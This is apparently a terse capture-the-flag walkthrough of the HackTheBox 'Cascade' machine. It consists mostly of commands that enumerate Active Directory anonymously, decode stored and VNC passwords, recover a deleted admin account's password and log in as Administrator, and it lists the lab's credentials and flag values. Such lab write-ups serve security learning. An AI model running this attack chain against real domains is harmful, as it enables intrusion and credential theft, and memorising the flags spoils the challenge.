ping 10.10.10.182
whatweb 10.10.10.182 -> get error

echo "10.10.10.182 cascade.htb" >> /etc/hosts

nmap cascade.htb
nmap -sCV -O cascade.htb
nmap -p- --min-rate 10000 cascade.htb

RPC 445 and TCP 445 SMB
rpcclient -U "" -N cascade.htb (anonymous login)
enumdomusers -> get user names

TCP 389 LDAP
ldapsearch -H ldap://cascade.htb -x -s base namingcontexts (enumarate)
ldapsearch -H ldap://cascade.htb -x -b "DC=cascade,DC=local" > dumped-ldap
ldapsearch -H ldap://cascade.htb -x -b "DC=cascade,DC=local" '(ObjectClass=person)' > dumped-people

inside dumped-data, find Ryan Thompson (r.thompson:clk0bjVldmE=)
echo 'clk0bjVldmE=' | base64 -d
rY4n5eva
r.thompson:rY4n5eva

crackmapexec smb -u r.thompson -p rY4n5eva cascade.htb --shares

smbclient --user r.thompson --password rY4n5eva //cascade.htb/data
mask ""
prompt OFF
recurse ON
mget *

take a look on Meeting_Notes_June_2018.html -> Steve Smith

cat "VNC Install.reg"
get "Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f (TightVNC)

install vncpwd (https://github.com/jeroennijhof/vncpwd)
compile -> run make or gcc -o vncpwd vncpwd.c d3des.c

../vncpwd <(echo '6bcf2a4b6e5aca0f' | xxd -r -p)
s.smith:sT333ve2

crackmapexec winrm cascade.htb -u s.smith -p sT333ve2 (Pwn3d!)
evil-winrm -i cascade.htb -u s.smith -p sT333ve2

cd ..
cat Desktop/user.txt -> get flag (bf64f659bd466e9ecb0fa27ab1c8a9ef)
net user s.smith
net localgroup "Audit Share"

crackmapexec smb -u s.smith -p sT333ve2 cascade.htb --shares -> find Audit$
smbclient --user s.smith --password sT333ve2 //cascade.htb/Audit$
mask ""
prompt OFF
recurse ON
mget *

file DB/Audit.db -> Sqlite 3.x
sqlite3 DB/Audit.db
.tables
select * from DeletedUserAdult
select * from Ldap -> arksvc info (arksvc:BQO5l5Kj9MdErXx6Q6AGOw==)
select * from Misc -> nothing

cat RunAudit.bat -> program runs CascAudit.exe (.NET) with args

copy files to Windows machine
install DNSpy (https://github.com/dnSpy/dnSpy)
open CascAudit.exe -> namespace CascAudiot
mark breakpoint on line 53 (sqliteConnection.Close())
debug program with DB/Audit.db location on arguments
on center bottom division (Locals), find the password
arksvc:w3lc0meFr31nd

crackmapexec winrm cascade.htb -u arksvc -p w3lc0meFr31nd (Pwn3d!)
evil-winrm -i cascade.htb -u arksvc -p w3lc0meFr31nd

net user arksvc -> AD Recycle Bin (https://blog.netwrix.com/2021/11/30/active-directory-object-recovery-recycle-bin/)

Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -> get TempAdmin
Get-ADObject -filter { SAMAccountName -eq "TempAdmin" } -includeDeletedObjects -property * -> get cascadeLegacyPwd : YmFDVDNyMWFOMDBkbGVz

echo YmFDVDNyMWFOMDBkbGVz | base64 -d
TempAdmin:baCT3r1aN00dles, i.e., Administrator:baCT3r1aN00dles (remember what was written in the email)

crackmapexec winrm cascade.htb -u administrator -p baCT3r1aN00dles
evil-winrm -i cascade.htb -u administrator -p baCT3r1aN00dles

cd c:\Users\Administrator\Desktop
more root.txt -> get flag (fbd4d4faaf5d7a27696b133ab79db962)